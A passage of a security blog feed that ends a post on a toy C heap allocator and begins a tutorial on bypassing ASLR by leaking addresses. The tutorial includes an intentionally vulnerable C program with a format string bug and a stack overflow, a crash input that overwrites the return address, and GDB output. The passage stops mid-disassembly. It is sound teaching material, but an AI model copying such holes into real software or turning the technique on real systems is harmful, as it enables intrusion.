            &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set head to the previous value&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Delete the next value in the linked list&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Reduce the size of the heap&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Main function&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Buffer 0 is working.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Buffer 1 is working.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Freeing buffer 0.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Buffer 2 has been allocated.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Buffer 2 has been allocated using buffer 0's chunk.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Freeing buffer 1.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Freeing buffer 2.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Compiling and running the program produces the following output.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc -o heap heap.h heap.c
$ ./heap
Buffer 0 is working.
Buffer 1 is working.
Freeing buffer 0.
Buffer 2 has been allocated.
Buffer 2 has been allocated using buffer 0's chunk.
Freeing buffer 1.
Freeing buffer 2.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/21/simple-heap-buffer-overflow.html&quot;&gt;
          Simple Heap Buffer Overflow
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">The heap is an important segment of memory that grows upwards, towards the stack. This section of memory is used by computers to dynamically allocate memory to store whatever data they need for their programs to work. Heap allocators are used by programs in order to allot and keep track of chunks of memory that are being used inside of the heap. Modern operating systems use efficient and effective heap allocators in their systems, but this blog post will just be going over how a very basic heap allocator can be constructed in C.</summary></entry><entry><title type="html">Defeating ASLR via Memory Leak</title><link href="http://localhost:4000/2020/12/29/defeating-aslr-via-memory-leak.html" rel="alternate" type="text/html" title="Defeating ASLR via Memory Leak" /><published>2020-12-29T00:00:00-05:00</published><updated>2020-12-29T00:00:00-05:00</updated><id>http://localhost:4000/2020/12/29/defeating-aslr-via-memory-leak</id><content type="html" xml:base="http://localhost:4000/2020/12/29/defeating-aslr-via-memory-leak.html">&lt;p&gt;Address Space Layout Randomization (ASLR) is a modern exploit mitigation technique that Operating Systems typically use to randomize addresses when a process is executed. This is implemented by having the OS change the locations of special areas, such as the base of executable, the heap, the stack, and any libraries that are loaded in memory. Since memory addresses are unpredictable when ASLR is turned on, hardcoded addresses can no longer be used in exploits when ASLR is enabled.&lt;/p&gt;

&lt;p&gt;Sometimes, if there is a poor implementation of ASLR, the addresses may not be very random (ex. only a byte or two actually change when the program is executed). In other cases, one might try to exploit a partial overwrite, which means that there are only a few unknown bytes of the address. In both of these cases, it may be possible to brute force all the possible addresses in our exploit. However, brute forcing is infeasible if the address space is properly randomized, so this blog post is going to be focused on using a more reliable method of bypassing ASLR: leaking memory addresses.&lt;/p&gt;

&lt;p&gt;One thing to note about ASLR is that it does not change offsets. That is, if during one instance of a process, there was a variable that was located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001000&lt;/code&gt; and a second variable that was located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001010&lt;/code&gt; in the same library, then the second variable will always be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes away from the first variable no matter what. If ASLR changes the first variable’s location to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001234&lt;/code&gt; while executing the program again, then the second variable must be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00001244&lt;/code&gt; because it must remain &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes away from the first variable.&lt;/p&gt;

&lt;p&gt;Because offsets remain the same, if an attacker can leak just one address from the program, the attacker will be able to use that one address to calculate any other addresses in the same memory mapping by adding or subtracting some constant offset. An attacker could then write an exploit that leaks an address off of the stack (using something like a format string vulnerability), use the leaked address to figure out the address of some shellcode, and exploit a buffer overflow to overwrite the return address with the calculated address of the shellcode. Since the offset does not change, this exploit should work in all instances.&lt;/p&gt;

&lt;p&gt;This is the C program that will be exploited:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Compilation: gcc -o buffers -fno-stack-protector -z execstack buffers.c&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your input for the first buffer (fmt str vuln): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter your input for the second buffer (stack overflow): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Assume that NX and stack canaries are disabled. The &lt;code class=&quot;highlighter-rouge&quot;&gt;printf(buf1)&lt;/code&gt; call is clearly vulnerable to a format string exploit since the user controls what’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;buf1&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;fgets(buf2, 300, stdin)&lt;/code&gt; is vulnerable to a stack buffer overflow because it is trying to read 300 bytes of data into a 100 byte buffer. After doing some poking around, one can see that the return address is located 232 bytes into the second buffer.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 -c &quot;print('A\n'+'A'*232+'BBBBBBBB')&quot; &amp;gt; test                                                    130 ⨯
$ ./buffers &amp;lt; test
Enter your input for the first buffer (fmt str vuln): A
zsh: segmentation fault  ./buffers &amp;lt; test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As proof, here is what this looks like in GDB. Note that the return address on the stack has been overwritten with B’s after 232 bytes have been written to the second buffer.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb buffers                                                                                            139 ⨯
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &quot;show copying&quot; and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;https://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.

For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
GEF for linux ready, type `gef' to start, `gef config' to configure
76 commands loaded for GDB 10.1 using Python engine 3.9
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from buffers...
(No debugging symbols found in buffers)
gef➤  r &amp;lt; test
Starting program: /home/nihaal/Desktop/buffers &amp;lt; test
Enter your input for the first buffer (fmt str vuln): A

Program received signal SIGSEGV, Segmentation fault.
0x00005555555552bb in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00005555555597a3  →  0x0000000000000000
$rdx   : 0x0
$rsp   : 0x00007fffffffe028  →  &quot;BBBBBBBB\n&quot;
$rbp   : 0x4141414141414141 (&quot;AAAAAAAA&quot;?)
$rsi   : 0x00005555555596b2  →  &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x00005555555552bb  →  &amp;lt;main+374&amp;gt; ret
$r8    : 0x00007fffffffdf40  →  &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;
$r9    : 0x0
$r10   : 0x0000555555556040  →  &quot;Enter your input for the second buffer (stack over[...]&quot;
$r11   : 0x246
$r12   : 0x0000555555555060  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe028│+0x0000: &quot;BBBBBBBB\n&quot;         ← $rsp
0x00007fffffffe030│+0x0008: 0x00007fffffff000a  →  0x0000000000000000
0x00007fffffffe038│+0x0010: 0x0000000100000000
0x00007fffffffe040│+0x0018: 0x0000555555555145  →  &amp;lt;main+0&amp;gt; push rbp
0x00007fffffffe048│+0x0020: 0x00007ffff7e157cf  →  &amp;lt;init_cacheinfo+287&amp;gt; mov rbp, rax
0x00007fffffffe050│+0x0028: 0x0000000000000000
0x00007fffffffe058│+0x0030: 0x852cdd6ab588b454
0x00007fffffffe060│+0x0038: 0x0000555555555060  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552b0 &amp;lt;main+363&amp;gt;       call   0x555555555040 &amp;lt;fgets@plt&amp;gt;
   0x5555555552b5 &amp;lt;main+368&amp;gt;       mov    eax, 0x0
   0x5555555552ba &amp;lt;main+373&amp;gt;       leave
 → 0x5555555552bb &amp;lt;main+374&amp;gt;       ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: &quot;buffers&quot;, stopped 0x5555555552bb in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552bb → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7fffffffe028:
 rip = 0x5555555552bb in main; saved rip = 0x4242424242424242
 Arglist at 0x4141414141414141, args:
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe030
 Saved registers:
  rip at 0x7fffffffe028
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is what the &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function looks like:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  disas main
Dump of assembler code for function main:
   0x0000555555555145 &amp;lt;+0&amp;gt;:     push   rbp
   0x0000555555555146 &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   0x0000555555555149 &amp;lt;+4&amp;gt;:     sub    rsp,0xf0
   0x0000555555555150 &amp;lt;+11&amp;gt;:    mov    DWORD PTR [rbp-0xe4],edi
   0x0000555555555156 &amp;lt;+17&amp;gt;:    mov    QWORD PTR [rbp-0xf0],rsi
   0x000055555555515d &amp;lt;+24&amp;gt;:    mov    QWORD PTR [rbp-0x70],0x0
   0x0000555555555165 &amp;lt;+32&amp;gt;:    mov    QWORD PTR [rbp-0x68],0x0
   0x000055555555516d &amp;lt;+40&amp;gt;:    mov    QWORD PTR [rbp-0x60],0x0
   0x0000555555555175 &amp;lt;+48&amp;gt;:    mov    QWORD PTR [rbp-0x58],0x0
   0x000055555555517d &amp;lt;+56&amp;gt;:    mov    QWORD PTR [rbp-0x50],0x0
   0x0000555555555185 &amp;lt;+64&amp;gt;:    mov    QWORD PTR [rbp-0x48],0x0
   0x000055555555518d &amp;lt;+72&amp;gt;:    mov    QWORD PTR [rbp-0x40],0x0
   0x0000555555555195 &amp;lt;+80&amp;gt;:    mov    QWORD PTR [rbp-0x38],0x0
   0x000055555555519d &amp;lt;+88&amp;gt;:    mov    QWORD PTR [rbp-0x30],0x0
   0x00005555555551a5 &amp;lt;+96&amp;gt;:    mov    QWORD PTR [rbp-0x28],0x0
   0x00005555555551ad &amp;lt;+104&amp;gt;:   mov    QWORD PTR [rbp-0x20],0x0
   0x00005555555551b5 &amp;lt;+112&amp;gt;:   mov    QWORD PTR [rbp-0x18],0x0
   0x00005555555551bd &amp;lt;+120&amp;gt;:   mov    DWORD PTR [rbp-0x10],0x0
   0x00005555555551c4 &amp;lt;+127&amp;gt;:   mov    QWORD PTR [rbp-0xe0],0x0
   0x00005555555551cf &amp;lt;+138&amp;gt;:   mov    QWORD PTR [rbp-0xd8],0x0
   0x00005555555551da &amp;lt;+149&amp;gt;:   mov    QWORD PTR [rbp-0xd0],0x0
   0x00005555555551e5 &amp;lt;+160&amp;gt;:   mov    QWORD PTR [rbp-0xc8],0x0
   0x00005555555551f0 &amp;lt;+171&amp;gt;:   mov    QWORD PTR [rbp-0xc0],0x0
   0x00005555555551fb &amp;lt;+182&amp;gt;:   mov    QWORD PTR [rbp-0xb8],0x0
   0x0000555555555206 &amp;lt;+193&amp;gt;:   mov    QWORD PTR [rbp-0xb0],0x0
   0x0000555555555211 &amp;lt;+204&amp;gt;:   mov    QWORD PTR [rbp-0xa8],0x0
   0x000055555555521c &amp;lt;+215&amp;gt;:   mov    QWORD PTR [rbp-0xa0],0x0
   0x0000555555555227 &amp;lt;+226&amp;gt;:   mov    QWORD PTR [rbp-0x98],0x0
   0x0000555555555232 &amp;lt;+237&amp;gt;:   mov    QWORD PTR [rbp-0x90],0x0
   0x000055555555523d &amp;lt;+248&amp;gt;:   mov    QWORD PTR [rbp-0x88],0x0
   0x0000555555555248 &amp;lt;+259&amp;gt;:   mov    DWORD PTR [rbp-0x80],0x0
   0x000055555555524f &amp;lt;+266&amp;gt;:   lea    rdi,[rip+0xdb2]        # 0x555555556008
   0x0000555555555256 &amp;lt;+273&amp;gt;:   mov    eax,0x0
   0x000055555555525b &amp;lt;+278&amp;gt;:   call   0x555555555030 &amp;lt;printf@plt&amp;gt;
   0x0000555555555260 &amp;lt;+283&amp;gt;:   mov    rdx,QWORD PTR [rip+0x2dd9]        # 0x555555558040 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;
   0x0000555555555267 &amp;lt;+290&amp;gt;:   lea    rax,[rbp-0x70]
   0x000055555555526b &amp;lt;+294&amp;gt;:   mov    esi,0x64
   0x0000555555555270 &amp;lt;+299&amp;gt;:   mov    rdi,rax
   0x0000555555555273 &amp;lt;+302&amp;gt;:   call   0x555555555040 &amp;lt;fgets@plt&amp;gt;
   0x0000555555555278 &amp;lt;+307&amp;gt;:   lea    rax,[rbp-0x70]
   0x000055555555527c &amp;lt;+311&amp;gt;:   mov    rdi,rax
   0x000055555555527f &amp;lt;+314&amp;gt;:   mov    eax,0x0
